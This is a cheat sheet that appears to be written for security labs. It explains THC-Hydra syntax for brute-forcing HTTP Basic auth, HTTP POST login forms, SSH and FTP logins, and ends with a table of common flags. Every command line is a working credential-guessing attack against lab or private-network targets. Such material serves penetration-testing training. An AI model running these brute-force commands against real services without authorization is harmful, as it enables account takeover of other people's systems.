# THC-Hydra: Network Login Brute-Forcing

THC-Hydra is a high-speed, parallelized network login brute-forcer supporting over 50 protocols, including HTTP Basic/Digest Auth, SSH, FTP, Telnet, SMB, RDP, and MySQL.

---

## 1. Core Mechanics & Architecture

```text
[ Wordlist / Dictionary ] ──► [ Hydra Multithreaded Engine ] ──► [ Target Network Service ]
                                          │                                │
                                          ▼                                ▼
                               (Parallel Worker Tasks)        (Returns Auth Success/Fail)
```

Unlike web fuzzers that fuzz arbitrary URL paths, Hydra is specifically designed to test authentication protocols by matching authentication response patterns (status codes, response strings, or banner handshakes).

---

## 2. Essential Command Syntax & Common Protocols

### 2.1 HTTP Basic Authentication Attack
```bash
hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt target.thm http-get /labs/basic_auth/
```

* `-l <username>`: Specifies a single static username (use `-L <file>` for a user wordlist).
* `-P <file>`: Specifies the password wordlist.
* `target.thm`: The target IP address or hostname.
* `http-get`: The service module to execute.
* `/labs/basic_auth/`: The protected endpoint URL path.

### 2.2 HTTP POST Form Brute-Forcing
```bash
hydra -l admin -P passwords.txt 192.168.10.30 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid credentials"
```

* Format: `"<URL-path>:<POST-body>:<Failure-Condition>"`
* `F=Invalid credentials`: Instructs Hydra to classify responses containing this string as failed attempts.

### 2.3 Network Service Cracking (SSH & FTP)
```bash
# SSH Dictionary Attack (Port 22)
hydra -L users.txt -P passwords.txt 192.168.10.20 ssh -t 4

# FTP Dictionary Attack (Port 21)
hydra -l ftpuser -P passwords.txt 192.168.10.30 ftp
```

---

## 3. High-Yield Command Flags

| Flag | Function / Purpose | Example Usage |
| :--- | :--- | :--- |
| `-l` / `-L` | Single target username (`-l admin`) or username list file (`-L users.txt`). | `-l admin` |
| `-p` / `-P` | Single password test (`-p secret`) or password wordlist (`-P rockyou.txt`). | `-P passwords.txt` |
| `-t <threads>` | Number of concurrent parallel connections (default is 16). | `-t 4` (safe for low-bandwidth targets) |
| `-f` | Exit immediately upon finding the first valid credential set. | `-f` |
| `-v` / `-V` | Verbose mode / show login attempt progress for each worker. | `-V` |
| `-s <port>` | Specify custom non-standard port. | `-s 8080` |
| `-o <file>` | Save successful credentials to an output file. | `-o cracked.txt` |
